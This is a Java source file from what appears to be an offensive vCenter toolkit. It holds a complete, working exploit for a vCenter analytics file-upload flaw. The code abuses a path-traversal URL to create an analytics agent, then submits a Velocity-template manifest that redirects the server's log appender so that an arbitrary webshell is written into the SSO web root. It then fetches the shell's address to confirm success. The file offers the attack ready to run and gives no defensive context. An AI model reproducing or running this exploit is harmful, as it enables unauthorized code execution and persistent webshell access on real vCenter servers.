package com.example.vcentertools.model.exp;
import cn.hutool.json.JSONUtil;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import java.util.Random;
import java.util.HashMap;
import java.util.Map;
import java.net.Proxy;
import java.net.InetSocketAddress;

public class Cve202222005 {

    public String upload_22005(String targetUrl,String filename,String filetext){
        String log_param = idGenerator(6);
        String agent_name = idGenerator(6);
        String webshell_location =  String.format("/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s", filename);
        String webshell = strToEscapedUnicode(filetext);
        String manifestData = generate_manifest(webshell_location,webshell);
        //String proxyHost = "127.0.0.1";
        //int proxyPort = 8080;
        //Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));

        //创建agent
        createAgent(targetUrl, agent_name, log_param);
        String url = String.format("%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s", targetUrl, agent_name, log_param);

        Map<String, String> headers = new HashMap<>();
        headers.put("Cache-Control", "max-age=0");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("User-Agent", "Mozilla/5.0");
        headers.put("X-Deployment-Secret", "abc");
        headers.put("Content-Type", "application/json");
        headers.put("Connection", "close");

        Map<String, Object> jsonData = new HashMap<>();
        jsonData.put("contextData", "a3");
        jsonData.put("manifestContent", manifestData);
        jsonData.put("objectId", "a2");
        HttpResponse response = HttpRequest.post(url)
                .addHeaders(headers)
                .body(JSONUtil.toJsonStr(jsonData))
                .timeout(5000)
                //.setProxy(proxy)
                .execute();
        //获取地址
        String url2 = String.format("%s/idm/..;/%s", targetUrl, filename);
        HttpResponse response2 = HttpRequest.get(url2)
                .addHeaders(headers)
                .timeout(5000)
                //.setProxy(proxy)
                .execute();

        // 打印响应状态码和内容（可根据需要修改,有时候好像就算返回状态码不是404，也没写成）
        System.out.println("Response Status Code: " + response2.getStatus());
        System.out.println("Response Body: " + response2.body());
        if(response2.getStatus() != 404) {
            return " [+] 文件上传成功！地址为：" + url2;
        }else{
            return " [-] 文件上传失败！未获取到地址。";
        }
    }

    public static void createAgent(String target, String agentName, String logParam) {
        String url = String.format("%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s", target, agentName, logParam);
        Map<String, String> headers = new HashMap<>();
        headers.put("Cache-Control", "max-age=0");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("User-Agent", "Mozilla/5.0");
        headers.put("X-Deployment-Secret", "abc");
        headers.put("Content-Type", "application/json");
        headers.put("Connection", "close");

        Map<String, Object> jsonData = new HashMap<>();
        jsonData.put("manifestSpec", new HashMap<>());
        jsonData.put("objectType", "a2");
        jsonData.put("collectionTriggerDataNeeded", true);
        jsonData.put("deploymentDataNeeded", true);
        jsonData.put("resultNeeded", true);
        jsonData.put("signalCollectionCompleted", true);
        jsonData.put("localManifestPath", "a7");
        jsonData.put("localPayloadPath", "a8");
        jsonData.put("localObfuscationMapPath", "a9");

        //String proxyHost = "127.0.0.1";
        //int proxyPort = 8080;
        //Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));

        HttpResponse response = HttpRequest.post(url)
                .addHeaders(headers)
                .body(JSONUtil.toJsonStr(jsonData))
                .timeout(5000)
                //.setProxy(proxy)
                .execute();

        // 打印响应状态码和内容（可根据需要修改）
        System.out.println("createAgent Response Status Code: " + response.getStatus());
        System.out.println("createAgent Response Body: " + response.body());
    }

    //字符串转uniocde
    public static String strToEscapedUnicode(String argStr) {
        StringBuilder escapedStr = new StringBuilder();
        for (int i = 0; i < argStr.length(); i++) {
            int val = argStr.charAt(i);
            String escUni = String.format("\\u%04x", val);
            escapedStr.append(escUni);
        }
        return escapedStr.toString();
    }

    //随机字符串
    public static String idGenerator(int size) {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        Random random = new Random();
        StringBuilder id = new StringBuilder(size);

        for (int i = 0; i < size; i++) {
            int randomIndex = random.nextInt(chars.length());
            id.append(chars.charAt(randomIndex));
        }

        return id.toString();
    }

    public String generate_manifest(String webshell_location, String webshell){
        String manifestTemplate =
                "<manifest recommendedPageSize=\"500\">\n" +
                        "   <request>\n" +
                        "      <query name=\"vir:VCenter\">\n" +
                        "         <constraint>\n" +
                        "            <targetType>ServiceInstance</targetType>\n" +
                        "         </constraint>\n" +
                        "         <propertySpec>\n" +
                        "            <propertyNames>content.about.instanceUuid</propertyNames>\n" +
                        "            <propertyNames>content.about.osType</propertyNames>\n" +
                        "            <propertyNames>content.about.build</propertyNames>\n" +
                        "            <propertyNames>content.about.version</propertyNames>\n" +
                        "         </propertySpec>\n" +
                        "      </query>\n" +
                        "   </request>\n" +
                        "   <cdfMapping>\n" +
                        "      <indepedentResultsMapping>\n" +
                        "         <resultSetMappings>\n" +
                        "            <entry>\n" +
                        "               <key>vir:VCenter</key>\n" +
                        "               <value>\n" +
                        "                  <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n" +
                        "                     <resourceItemToJsonLdMapping>\n" +
                        "                        <forType>ServiceInstance</forType>\n" +
                        "                     <mappingCode><![CDATA[\n" +
                        "                        #set($appender = $GLOBAL-logger.logger.parent.getAppender(\"LOGFILE\"))##\n" +
                        "                        #set($orig_log = $appender.getFile())##\n" +
                        "                        #set($logger = $GLOBAL-logger.logger.parent)##\n" +
                        "                        $appender.setFile(\"%s\")##\n" +
                        "                        $appender.activateOptions()##\n" +
                        "                        $logger.warn(\"%s\")##\n" +
                        "                        $appender.setFile($orig_log)##\n" +
                        "                        $appender.activateOptions()##\n" +
                        "                     ]]></mappingCode>\n" +
                        "                     </resourceItemToJsonLdMapping>\n" +
                        "                  </value>\n" +
                        "               </value>\n" +
                        "            </entry>\n" +
                        "         </resultSetMappings>\n" +
                        "      </indepedentResultsMapping>\n" +
                        "   </cdfMapping>\n" +
                        "   <requestSchedules>\n" +
                        "      <schedule interval=\"1h\">\n" +
                        "         <queries>\n" +
                        "            <query>vir:VCenter</query>\n" +
                        "         </queries>\n" +
                        "      </schedule>\n" +
                        "   </requestSchedules>\n" +
                        "</manifest>";
        return String.format(manifestTemplate, webshell_location, webshell);
    }
}